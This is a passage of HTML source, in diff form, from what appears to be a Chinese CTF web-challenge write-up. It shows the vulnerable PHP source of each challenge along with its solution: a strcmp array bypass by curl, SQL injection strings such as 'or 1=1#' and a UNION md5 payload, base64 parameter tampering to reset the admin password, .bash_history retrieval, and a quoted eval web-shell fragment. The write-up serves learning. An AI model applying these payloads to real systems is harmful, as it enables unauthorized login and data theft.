+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x06-pass-check" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>给出代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$pass</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass1</span><span class="o">=***********</span><span class="p">;</span><span class="c1">//被隐藏起来的密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">@!</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$pass</span><span class="p">,</span><span class="nv">$pass1</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;flag:nctf{*}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;the pass is wrong!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;please input pass!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>尝试变量覆盖失败,查找 strcmp 函数的绕过方法。</p>
+<blockquote>
+<p>Php5.3 之后版本使用 strcmp 比较一个字符串和数组的话,将不再返回-1 而是返回 0</p></blockquote>
+<p>构造 <code>curl http://chinalover.sinaapp.com/web21/ -X POST -d &quot;pass[]=1&quot;</code></p>
+<p>得到 Flag。</p>
+
+
+<h2 class="relative group">0x07 <a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank">起名字真难</a> 
+    <div id="0x07-%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x07-%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>给出源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">noother_says_correct</span><span class="p">(</span><span class="nv">$number</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$one</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$nine</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;9&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$number</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$digit</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$number</span><span class="p">{</span><span class="nv">$i</span><span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$digit</span> <span class="o">&gt;=</span> <span class="nv">$one</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$digit</span> <span class="o">&lt;=</span> <span class="nv">$nine</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$number</span> <span class="o">==</span> <span class="s1">&#39;54975581388&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="s1">&#39;*******&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">noother_says_correct</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">   <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">   <span class="k">echo</span> <span class="s1">&#39;access denied&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>key 不能为 1-9 的数字, 但是要求等于 &lsquo;54975581388&rsquo;</p>
+<p>这个数字刚好是 0xccccccccc ,传入参数得到 key</p>
+
+
+<h2 class="relative group">0x08 <a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==" target="_blank">密码重置</a> 
+    <div id="0x08-%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x08-%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>一看网址就发现了 base64 编码的参数，解密后 是 ctfuser，即当前页面的默认用户名。我们需要重置 admin 的密码，那么网址的参数需要改为 admin 的 base64 编码 YWRtaW4= 。</p>
+<p>然后发现表单中的用户名被设置成了 readonly ，按 F12 改为 admin 即可。</p>
+
+
+<h2 class="relative group">0x09 <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank">SQL Injection</a> 
+    <div id="0x09-sql-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x09-sql-injection" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>网页中注释源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#GOAL: login as admin,then get the flag;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;db.inc.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">clean</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">()){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$str</span><span class="o">=</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="o">@</span><span class="nx">clean</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="o">@</span><span class="nx">clean</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s1">&#39;SELECT * FROM users WHERE name=\&#39;&#39;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s1">&#39;\&#39; AND pass=\&#39;&#39;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span> <span class="o">||</span> <span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid password!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span></code></pre></div><blockquote>
+<p>stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。</p>
+<p>提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<p>htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为 html 实体,这样我们就不能闭合源码中的 ’ 了</p>
+<p>简单的说，就是我们加的 \ 会被去掉，’ 或者 ” 会被转变。</p></blockquote>
+<blockquote>
+<ol>
+<li>对于 PHP magic_quotes_gpc=on 的情况， 我们可以不对输入和输出数据库的字符串数据作 addslashes()和 stripslashes()的操作,数据也会正常显示。</li>
+</ol>
+<p>如果此时你对输入的数据作了 addslashes()处理，那么在输出的时候就必须使用 stripslashes()去掉多余的反斜杠。</p>
+<ol start="2">
+<li>
+<p>对于 PHP magic_quotes_gpc=off 的情况</p>
+<p>必须使用 addslashes()对输入数据进行处理，但并不需要使用 stripslashes()格式化输出，因为 addslashes()并未将反斜杠一起写入数据库，只是帮助 mysql 完成了 sql 语句的执行。</p>
+</li>
+</ol></blockquote>
+<blockquote>
+<p>这个特性在 PHP5.3.0 中已经废弃并且在 5.4.0 中已经移除了（This feature has been DEPRECATED as of PHP 5.3.0 and REMOVED as of PHP 5.4.0.）。所以没有理由再使用魔术引号，因为它不再是 PHP 支持的一部分。 不过它帮助了新手在不知不觉中写出了更好（更安全）的代码。 但是在处理代码的时候，最好是更改你的代码而不是依赖于魔术引号的开启。</p></blockquote>
+<p>查询语句：
+<code>SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';</code></p>
+<p>整理后为<code>SELECT * FROM users WHERE name=' username ' AND pass=' password ';</code></p>
+<p>构造 <code>?username=admin%20\&amp;password=%20or%201=1%23</code></p>
+<p>使得后台执行的语句为 <code>SELECT * FROM users WHERE name=' admin \' AND pass=' or 1=1</code></p>
+
+
+<h2 class="relative group">0x0a <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank">综合题</a> 
+    <div id="0x0a-%E7%BB%BC%E5%90%88%E9%A2%98" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x0a-%E7%BB%BC%E5%90%88%E9%A2%98" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>jsfuck 编码，在 FireFox 的控制台里竟然没有办法直接运行！？还报了一行警告： Scam Warning: Take care when pasting things you don’t understand. This could allow attackers to steal your identity or take control of your computer. Please type ‘allow pasting’ below (no need to press enter) to allow pasting. 我觉得有道理，就放在 Chrome 的控制台里执行了。</p>
+<p>结果： <code>1bc29b36f623ba82aaf6724fd3b16718.php</code></p>
+<p>访问得到提示： <code>哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里</code></p>
+<p>说明在响应头里，得到提示 <code>tip: history of bash</code></p>
+<p>bash 的历史记录储存在 .bash_history 文件里面，尝试访问。得到 <code>zip -r flagbak.zip ./*</code> ,一个打包的命令，下载该文件并解压，得到 Flag</p>
+
+
+<h2 class="relative group">0x0b <a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank">SQL 注入 2</a> 
+    <div id="0x0b-sql-%E6%B3%A8%E5%85%A5-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x0b-sql-%E6%B3%A8%E5%85%A5-2" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>题目说主要考察 UNION 查询，给出了源代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">pass</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nx">mysql_connect</span><span class="p">(</span><span class="nx">SAE_MYSQL_HOST_M</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nx">SAE_MYSQL_PORT</span><span class="p">,</span><span class="nx">SAE_MYSQL_USER</span><span class="p">,</span><span class="nx">SAE_MYSQL_PASS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">mysql_select_db</span><span class="p">(</span><span class="nx">SAE_MYSQL_DB</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">user</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">pass</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;select pw from ctf where user=&#39;</span><span class="si">$user</span><span class="s2">&#39;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="nv">$query</span><span class="p">[</span><span class="nx">pw</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="nx">strcasecmp</span><span class="p">(</span><span class="nv">$pass</span><span class="p">,</span> <span class="nv">$query</span><span class="p">[</span><span class="nx">pw</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;&lt;p&gt;Log in failure!&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>查询语句 <code>select pw from ctf where user='$user'</code> ，将 pass 进行 MD5 加密后与选到的密码进行对比。</p>
+<p>构造 <code>user=%27union select md5(1)%23&amp;pass=1</code> 即可</p>
+
+
+<h2 class="relative group">0x0c <a href="http://cms.nuptzj.cn/" target="_blank">综合题 2</a> 
+    <div id="0x0c-%E7%BB%BC%E5%90%88%E9%A2%98-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x0c-%E7%BB%BC%E5%90%88%E9%A2%98-2" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">一个很有意思的网站，先收集一下信息。 
+    <div id="%E4%B8%80%E4%B8%AA%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%BD%91%E7%AB%99%E5%85%88%E6%94%B6%E9%9B%86%E4%B8%80%E4%B8%8B%E4%BF%A1%E6%81%AF" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E4%B8%80%E4%B8%AA%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%BD%91%E7%AB%99%E5%85%88%E6%94%B6%E9%9B%86%E4%B8%80%E4%B8%8B%E4%BF%A1%E6%81%AF" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>index.php 主页文件</li>
+<li>about.php 可以查看其他文件</li>
+<li>sm.txt CMS 的说明文档</li>
+<li>config.php 数据库信息</li>
+<li>passencode.php 加密算法</li>
+<li>say.php 用于接受和处理用户留言请求</li>
+<li>so.php 搜索</li>
+<li>preview.php 预览</li>
+</ul>
+<p>admin 表结构 create table admin ( id integer, username text, userpass text, )</p>
+<p>已知页面的参数</p>
+<ul>
+<li>about.php?file=<filename>
+可以传一个 file 参数</li>
+<li>index.php?page=1
+在第二页发现内容 <code>&lt;?php eval($_POST['1:123',1)#</code></li>
+<li>say.php
+say.php?nice=&amp;usersay=&amp;Submit=确认提交</li>
+</ul>
+
+
+<h3 class="relative group">尝试通过 about.php 获取其他文件内容。 
+    <div id="%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87-aboutphp-%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87-aboutphp-%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>
+<p>index.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])){</span> <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;userpass&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php //这里输出用户留言
+</span></span></span><span class="line"><span class="cl"><span class="err">include &#39;antixss.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">include &#39;config.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">$con = mysql_connect($db_address,$db_user,$db_pass) or die(&#34;不能连接到数据库！！&#34;.mysql_error());
+</span></span></span><span class="line"><span class="cl"><span class="err">mysql_select_db($db_name,$con);
+</span></span></span><span class="line"><span class="cl"><span class="err">$page=$_GET[&#39;page&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">if($page==&#34;&#34; || $page==0){ $page=&#39;1&#39;; }
+</span></span></span><span class="line"><span class="cl"><span class="err">$page=intval($page);
+</span></span></span><span class="line"><span class="cl"><span class="err">$start=($page-1)*7;
+</span></span></span><span class="line"><span class="cl"><span class="err">$last=$page*7;
+</span></span></span><span class="line"><span class="cl"><span class="err">$result=mysql_query(&#34;SELECT * FROM `message` WHERE display=1 ORDER BY id LIMIT $start,$last&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">if(mysql_num_rows($result)&gt;0){
+</span></span></span><span class="line"><span class="cl"><span class="err">    while($rs=mysql_fetch_array($result)){
+</span></span></span><span class="line"><span class="cl"><span class="err">        echo htmlspecialchars($rs[&#39;nice&#39;],ENT_QUOTES).&#34;:&lt;br /&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;.antixss($rs[&#39;say&#39;]).&#39;&lt;br /&gt;&lt;hr /&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">mysql_free_result($result); ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">$contents=mysql_query(&#34;SELECT * FROM `message` WHERE display=1&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">if(mysql_num_rows($contents)&gt;0){
+</span></span></span><span class="line"><span class="cl"><span class="err">    $num=mysql_num_rows($contents);
+</span></span></span><span class="line"><span class="cl"><span class="err">    if($num%8!=0){ $pagenum=intval($num/8)+1;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">    else{
+</span></span></span><span class="line"><span class="cl"><span class="err">        $pagenum=intval($num/8);
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">    for($i=1;$i&lt;=$pagenum;$i++){
+</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#39;&lt;a href=&#34;index.php?page=&#39;.htmlspecialchars($i).&#39;&#34;&gt;&#39;.htmlspecialchars($i).&#39;&lt;/a&gt;&amp;nbsp;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">mysql_free_result($contents);
+</span></span></span><span class="line"><span class="cl"><span class="err">mysql_close($con);
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></div><p>在文件前看到 setcookie 函数，查看响应头发现格式如下。
+username=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
+userpass=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT</p>
+</li>
+<li>
+<p>about.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s2">&#34;&#34;</span> <span class="o">||</span> <span class="nx">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;config.php&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;file参数不能为空！&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$cut</span><span class="o">=</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&#34;loginxlcteam&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$cut</span><span class="o">==</span><span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$date</span><span class="o">=</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$date</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></li>
+<li>
+<p>so.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&#34;Xlcteam Browser&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$id</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;soid&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"> <span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="k">include</span> <span class="s1">&#39;antiinject.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="k">include</span> <span class="s1">&#39;antixss.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$id</span><span class="o">=</span><span class="nx">antiinject</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="nv">$db_address</span><span class="p">,</span><span class="nv">$db_user</span><span class="p">,</span><span class="nv">$db_pass</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;不能连接到数据库！！&#34;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">mysql_select_db</span><span class="p">(</span><span class="nv">$db_name</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$id</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM `message` WHERE display=1 AND id=</span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$rs</span><span class="o">=</span><span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
